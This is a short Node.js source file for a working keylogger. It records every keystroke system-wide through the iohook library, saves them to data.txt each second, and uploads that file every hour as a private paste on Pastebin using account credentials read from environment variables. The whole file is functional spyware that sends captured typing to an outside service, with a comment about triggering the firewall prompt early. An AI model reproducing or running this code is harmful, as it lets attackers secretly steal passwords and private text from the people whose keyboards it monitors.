'use strict';

const fs = require('fs'), 
PastebinAPI = require('pastebin-js'),
ioHook = require('iohook');

require('dotenv').config();

let logs = "";

//Keylogger
let keystrokes = "Keystrokes start now : ";

//Remote file service
let pastebin = new PastebinAPI({
    api_dev_key: process.env.PASTEBIN_KEY,
    api_user_name: process.env.PASTEBIN_USERNAME,
    api_user_password: process.env.PASTEBIN_PASSWORD
});

async function save_local_file(){
    await fs.writeFileSync("data.txt", keystrokes);
    
}
async function save_remote_file(){
    try {
    await pastebin.createPasteFromFile({
        filename: "data.txt", 
        title: "data", 
        format: null, 
        privacy: 3, 
        expiration: "10M"
    });
    } catch(e) {
        logs+=e.message;
        await fs.writeFileSync("logs.txt", logs);
    }
}
async function start(){
    try {
        //Init keylogger
        ioHook.on("keydown", event => {
            keystrokes+= String.fromCharCode(event.rawcode);
        });
        ioHook.start();

        //Save local file once to make it available to remote file service
        await save_local_file();

        //Save local file every second
        setInterval(async function(){
            await save_local_file();
        },1000);

        //Save network file once to prompt firewall window
        await save_remote_file();

        //Save network file every hour
        setInterval(async function(){
            await save_remote_file();
        },3600000);

    } catch(e){
        console.error(e);
    }
}

start();
